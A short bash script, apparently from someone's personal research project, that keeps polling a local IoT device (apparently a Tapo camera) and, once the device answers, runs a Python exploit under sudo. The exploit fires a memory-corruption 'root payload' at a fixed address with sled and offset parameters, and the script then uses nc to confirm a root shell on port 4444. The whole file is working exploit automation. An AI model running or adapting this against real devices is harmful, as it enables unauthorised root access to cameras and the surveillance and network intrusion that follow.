#!/bin/bash
# Auto-fire the C460 root payload at the FOUND address (hang hit 2026-10-28) when present.
cd /Users/jemanuel/projects/franken_surveillance_system
ADDR=0xbef8b000
LOG=/tmp/c460_fire.log
for i in $(seq 1 240); do
  ping -c 1 -W 500 192.168.4.33 >/dev/null 2>&1 || { sleep 30; continue; }
  echo "$(date +%H:%M:%S) PRESENT — firing root payload at $ADDR" >> "$LOG"
  sudo -n python3 deliverables/scripts/tapo_connectap_sc.py guard --host 192.168.4.33 \
    --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
    --addr $ADDR --count 1 --mac 50:3D:D1:E3:E2:07 --guard-gap 3 >> "$LOG" 2>&1
  if nc -z -G 3 192.168.4.33 4444 2>/dev/null; then echo "SHELL CONFIRMED on :4444" >> "$LOG"; break; fi
  sleep 60
done
